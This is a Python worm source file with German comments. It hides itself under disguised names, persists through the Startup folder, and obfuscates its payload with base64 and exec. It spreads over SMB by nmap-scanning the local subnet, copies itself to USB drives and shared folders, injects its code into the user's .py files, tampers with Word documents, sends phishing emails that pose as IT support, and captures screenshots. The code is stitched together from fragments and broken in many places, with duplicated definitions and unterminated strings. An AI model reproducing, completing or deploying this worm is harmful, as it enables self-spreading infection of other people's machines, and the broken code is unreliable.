import shutil
import os
import keyboard
import time
import win32com.client
import sys
import subprocess
import pyautogui
import os
import random
import base64
import shutil
import socket
import nmap
import subprocess
import time


WORM_NAME = "Urlaub2024 .jpg.exe"
HIDDEN_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
HIDDEN_FILE = os.path.join(HIDDEN_PATH, WORM_NAME)

try:

TARGET_DIRS = [
    os.path.expanduser("~\\Desktop"),
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Downloads"),
    
]



TARGET_DIRS = [
     os.path.expanduser("~\\Desktop





]


AUTOSTART_PATH = os.path.expanduser(
    "~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
WORM_NAME = "Detrix.exe"
SMTP_SERVER = "192.168.1.100"  
SMTP_PORT = 25  
SENDER_EMAIL = "infiziert@testnetz.local"
RECIPIENT_EMAIL = "opfer@testnetz.local"




hidden_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\")
startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
usb_path = "E:\\"  # Beispiel für USB-Laufwerk

rnd1 = random.randint(1000, 9999)
worm_name = f"winupdate_{rnd1}.py"


junk_code = f"""
def fake_function_{rnd1}():
    var_{rnd1} = {random.randint(1, 100)}
    var_{rnd1})
"""


payload_code = f"""
def real_payload_{rnd1}():
     Version {rnd1}")
"""

















code_blocks = [junk_code, payload_code]
random.shuffle(code_blocks)
final_code = "\n".join(code_blocks)


encoded_code = base64.b64encode(final_code.encode()).decode()

wrapper_code = f"""
import base64
exec(base64.b64decode('{encoded_code}').decode())
"""


filenames = [
    os.path.join(hidden_path, worm_name),
    os.path.join(startup_path, worm_name),  # Autostart
    os.path.join(usb_path, worm_name)  # USB-Verbreitung
]


for filename in filenames:
    with open(filename, "w") as f:
        f.write(wrapper_code)
    print(f"➡ Wurm kopiert nach: {filename}")


if os.path.exists(filenames[1]):
    os.startfile(filenames[1])


def find_targets():
    """ Sucht nach anderen PCs im Netzwerk """
    nm = nmap.PortScanner()
    ip_range = socket.gethostbyname(socket.gethostname()) + "/24"
    nm.scan(hosts=ip_range, arguments="-p 445 --open")  # SMB-Port
    return [host for host in nm.all_hosts() if nm[host].state() == "up"]

def infect_target(target_ip):
    """ Versucht, den Wurm auf ein anderes System zu kopieren """
    remote_path = f"\\\\{target_ip}\\C$\\Users\\Public\\{worm_name}"
    try:
        shutil.copy(worm_name, remote_path)
        
    


targets = find_targets()
for target in targets:
    infect_target(target)


def infect_usb():
    """ Versucht, den Wurm auf ein USB-Laufwerk zu kopieren """
    try:
        if os.path.exists(usb_path):
            shutil.copy(worm_name, usb_path)
            
    except Exception as e:
        

infect_usb()



def hide_file():
    """ Macht die Datei unsichtbar in Windows """
    try:
        subprocess.call(["attrib", "+H", worm_name])  # Setzt das "Hidden"-Attribut
        
    except Exception as e:
        

hide_file()



from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

WORM_NAME = "WurmTest.exe"
SMTP_SERVER = "192.168.1.100"  # Ersetze mit IP des Test-Mailservers
SMTP_PORT = 25  # Port für unverschlüsseltes SMTP
SENDER_EMAIL = "infiziert@testnetz.local"
RECIPIENT_EMAIL = "opfer@testnetz.local"


def send_infected_email():
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "Dringend: Email durch Software !"

    body = "Hallo,\n\nBitte führen Sie das beigefügte Update aus. Es behebt kritische Sicherheitsprobleme.\n\nViele Grüße,\nIT-Support"
    msg.attach(MIMEText(body, 'plain'))

  
    attachment = open(WORM_NAME, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename={WORM_NAME}")
    msg.attach(part)
    attachment.close()

    
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.sendmail(SENDER_EMAIL, RECIPIENT_EMAIL, msg.as_string())
        server.quit()
        print("[+] Infizierte E-Mail gesendet!")
    except Exception as e:
        print(f"[-] Fehler beim Senden: {e}")


if __name__ == "__main__":
    send_infected_email()

def spread():

    worm_path = os.path.abspath(__file__)

    if not os.path.exists(HIDDEN_FILE):
        shutil.copy(worm_path, HIDDEN_FILE)
        print(f"[+] Wurm versteckt in: {HIDDEN_FILE}")

    for target in TARGET_DIRS:
        new_path = os.path.join(target, WORM_NAME)
        if not os.path.exists(new_path):
            shutil.copy(HIDDEN_FILE, new_path)
            print(f"[+]: {new_path}")

    drives = [f"{d}:\\" for d in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        usb_path = os.path.join(drive, WORM_NAME)
        if not os.path.exists(usb_path):
            shutil.copy(HIDDEN_FILE, usb_path)
            print(f"[+]: {usb_path}")


def infect_other_scripts():
    for root, _, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith(".py") and file != WORM_NAME:
                target_path = os.path.join(root, file)
                with open(target_path, "r", encoding="utf-8") as f:
                    content = f.read(
                if "PhantomByte" not in content:
                    with open(target_path, "w", encoding="utf-8") as f:
                        f.write(content + f"\n# PhantomByte\n{open(__file__).read()}")


def infect_word_docs():
    """ Fügt sich in alle Word-Dateien ein """
    word = win32com.client.Dispatch("Word.Application")
    word.Visible = False

    for folder in TARGET_DIRS:
        for file in os.listdir(folder):
            if file.endswith(".docx") or file.endswith(".doc"):
                file_path = os.path.join(folder, file)
                try:
                    doc = word.Documents.Open(file_path)
                    doc.Content.InsertAfter("\n\n PhantomByte war hier!")
                    doc.Save()
                    doc.Close()
                    print(f: {file_path}
                    ")
                except Exception as e:
                    print(f"[-] {file_path}: {e}")

import os

    network_shares = ["\\\\192.168.1.100\\freigabe", "\\\\192.168.1.101\\public"]
    for share in network_shares:
        try:
            os.system(f'copy {__file__} {share}\\Urlaub2024.jpg.exe')
            print(f"[+] Wurm verbreitet auf {share}")
        except Exception as e:
            print(f"[-] Fehler bei {share}: {e}")

    word.Quit()
for target in TARGET_DIRS:
    new_path = os.path.join(target, WORM_NAME)
    if not os.path.exists(new_path):
        shutil.copy(HIDDEN_FILE, new_path)
        print(f"[+] {new_path}")

WORM_NAME = "WurmTest.exe"
TARGET_SHARE = r"\\192.168.1.102\Freigabe"  # Beispiel-IP des Opfer-PCs

def spread_via_smb():
    try:
        dest_path = os.path.join(TARGET_SHARE, WORM_NAME)
        shutil.copy(WORM_NAME, dest_path)
        print(f"[+] Wurm nach {dest_path} kopiert!")
    except Exception as e:
        print(f"[-] Fehler beim Kopieren: {e}")

if __name__ == "__main__":
    spread_via_smb()



def self_modify():

    global TARGET_DIRS
    if random.choice([True, False]):
        new_dir = os.path.expanduser("~\\Videos")
        TARGET_DIRS.append(new_dir)
        print(f"[+] : {TARGET_DIRS}")



def take_screenshot():
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"C:\\Users\\Public\\screenshot_{time.time()}.png")
        time.sleep(0.01)

take_screenshot()


def enable_autostart():
    if not os.path.exists(AUTOSTART_PATH)
        shutil.copy(HIDDEN_FILE, AUTOSTART_PATH)
        print(f"[+]  {AUTOSTART_PATH}")


def hide_file():

    try:
        subprocess.call(["attrib", "+H", HIDDEN_FILE])
        print(f"[+]
    except:
        print("[-]


def run_worm():
    

    enable_autostart
    hide_file()




if __name__ == "__main__":
    run_worm()


